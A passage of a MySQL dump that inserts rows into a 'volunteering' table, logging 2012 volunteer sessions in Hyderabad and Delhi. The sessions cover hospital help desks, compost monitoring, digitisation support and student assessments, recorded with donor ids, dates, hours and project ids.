(713, '258', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(714, '259', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(715, '274', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(716, '260', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(717, '198', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(718, '174', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(719, '280', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(720, '282', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(721, '283', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(722, '202', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(723, '285', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(724, '286', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(725, '290', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(726, '287', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(727, '292', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(728, '291', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(729, '288', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(730, '289', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(731, '257', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(732, '258', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(733, '259', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(734, '274', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(735, '260', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(736, '171', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(737, '198', '2012-08-11', '2012-08-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(738, '296', '2012-07-14', '2012-07-14', '11:00:00', '01:00:00', '2', 'Shram Daan', 'Education', 'Conducting baseline assessment for students from bridge school', 'Onsite', 'Delhi', 'Basix', '', 14),
(739, '297', '2012-07-14', '2012-07-14', '11:00:00', '01:00:00', '2', 'Shram Daan', 'Education', 'Conducting baseline assessment for students from bridge school', 'Onsite', 'Delhi', 'Basix', '', 14),
(740, '298', '2012-07-14', '2012-07-14', '11:00:00', '01:00:00', '2', 'Shram Daan', 'Education', 'Conducting baseline assessment for students from bridge school', 'Onsite', 'Delhi', '', '', 14),
(741, '299', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Education', 'Conducting baseline assessment for students from bridge school', 'Onsite', 'Delhi', '', '', 14),
(742, '300', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Education', 'Conducting baseline assessment for students from bridge school', 'Onsite', 'Delhi', 'Google', '', 14),
(743, '301', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Education', 'Conducting baseline assessment for students from bridge school', 'Onsite', 'Delhi', 'Google', '', 14),
(744, '31', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Education', 'Conducting baseline assessment for students from bridge school', 'Onsite', 'Delhi', 'Deloitte', '', 14),
(745, '298', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Education', 'Conducting baseline assessment for students from bridge school', 'Onsite', 'Delhi', '', '', 14),
(746, '31', '2012-08-18', '2012-08-18', '11:00:00', '01:00:00', '2', 'Shram Daan', 'Promotion', 'Preparing Presentation for Power of ideas Competition', 'Offsite', 'Delhi', 'Deloitte', '', 0),
(747, '306', '2012-08-13', '2012-08-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(748, '307', '2012-08-13', '2012-08-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(749, '308', '2012-08-13', '2012-08-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(750, '316', '2012-08-13', '2012-08-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(751, '317', '2012-08-13', '2012-08-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(752, '306', '2012-08-14', '2012-08-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(753, '307', '2012-08-14', '2012-08-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(754, '308', '2012-08-14', '2012-08-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(755, '316', '2012-08-14', '2012-08-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(756, '317', '2012-08-14', '2012-08-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(757, '186', '2012-08-16', '2012-08-16', '10:30:00', '12:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(758, '310', '2012-08-16', '2012-08-16', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(759, '311', '2012-08-16', '2012-08-16', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(760, '312', '2012-08-16', '2012-08-16', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(761, '313', '2012-08-16', '2012-08-16', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(762, '176', '2012-08-16', '2012-08-16', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(763, '202', '2012-08-16', '2012-08-16', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(764, '184', '2012-08-16', '2012-08-16', '10:30:00', '12:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(765, '314', '2012-08-14', '2012-08-14', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(766, '315', '2012-08-14', '2012-08-14', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(767, '173', '2012-08-14', '2012-08-14', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(768, '182', '2012-08-14', '2012-08-14', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(769, '263', '2012-08-04', '2012-08-04', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(770, '262', '2012-08-04', '2012-08-04', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(771, '285', '2012-08-07', '2012-08-07', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(772, '286', '2012-08-07', '2012-08-07', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(773, '173', '2012-08-07', '2012-08-07', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(774, '182', '2012-08-07', '2012-08-07', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(775, '194', '2012-08-16', '2012-08-16', '10:30:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(776, '195', '2012-08-16', '2012-08-16', '10:30:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(777, '196', '2012-08-16', '2012-08-16', '10:30:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(778, '197', '2012-08-16', '2012-08-16', '10:30:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(779, '178', '2012-06-21', '2012-06-21', '13:00:00', '18:00:00', '4', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at Aurora', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(780, '314', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(781, '319', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(782, '257', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(783, '259', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(784, '274', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(785, '198', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(786, '199', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(787, '318', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(788, '276', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(789, '277', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(790, '278', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(791, '279', '2012-08-17', '2012-08-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(792, '228', '2012-08-18', '2012-08-18', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(793, '227', '2012-08-18', '2012-08-18', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(794, '257', '2012-08-18', '2012-08-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(795, '259', '2012-08-18', '2012-08-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(796, '198', '2012-08-18', '2012-08-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(797, '260', '2012-08-18', '2012-08-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(798, '276', '2012-08-18', '2012-08-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(799, '277', '2012-08-18', '2012-08-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(800, '278', '2012-08-18', '2012-08-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(801, '279', '2012-08-18', '2012-08-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(802, '314', '2012-08-18', '2012-08-18', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(803, '319', '2012-08-18', '2012-08-18', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(804, '174', '2012-08-19', '2012-08-19', '09:30:00', '15:00:00', '6', 'Shram Daan', 'Environment', 'Setting up of 2 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(805, '174', '2012-08-20', '2012-08-20', '13:00:00', '14:00:00', '1', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(806, '263', '2012-08-21', '2012-08-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(807, '262', '2012-08-21', '2012-08-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(808, '228', '2012-08-21', '2012-08-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(809, '227', '2012-08-21', '2012-08-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(810, '232', '2012-08-21', '2012-08-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(811, '263', '2012-08-21', '2012-08-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(812, '262', '2012-08-21', '2012-08-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(813, '204', '2012-08-21', '2012-08-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(814, '203', '2012-08-21', '2012-08-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(815, '190', '2012-08-21', '2012-08-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(816, '320', '2012-08-21', '2012-08-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(817, '228', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(818, '227', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(819, '232', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(820, '321', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(821, '322', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(822, '323', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(823, '324', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7);
INSERT INTO `volunteering` (`volunteer_act_id`, `donor_id`, `from_date`, `to_date`, `from_time`, `to_time`, `hours`, `donation_type`, `area`, `activity_done`, `onsite_offsite`, `location`, `organisation`, `notes`, `project_id`) VALUES
(824, '325', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(825, '326', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(826, '327', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(827, '328', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(828, '329', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(829, '330', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(830, '169', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(831, '280', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(832, '281', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(833, '282', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(834, '283', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(835, '183', '2012-08-22', '2012-08-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(836, '374', '2012-08-23', '2012-08-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(837, '375', '2012-08-23', '2012-08-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(838, '376', '2012-08-23', '2012-08-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(839, '194', '2012-08-23', '2012-08-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(840, '195', '2012-08-23', '2012-08-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(841, '196', '2012-08-23', '2012-08-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(842, '197', '2012-08-23', '2012-08-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(843, '257', '2012-08-24', '2012-08-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(844, '258', '2012-08-24', '2012-08-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(845, '198', '2012-08-24', '2012-08-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(846, '336', '2012-08-24', '2012-08-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(847, '335', '2012-08-24', '2012-08-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(848, '314', '2012-08-25', '2012-08-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(849, '319', '2012-08-25', '2012-08-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(850, '331', '2012-08-25', '2012-08-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(851, '332', '2012-08-25', '2012-08-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(852, '333', '2012-08-25', '2012-08-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(853, '334', '2012-08-25', '2012-08-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(854, '337', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(855, '338', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(856, '339', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(857, '340', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(858, '341', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
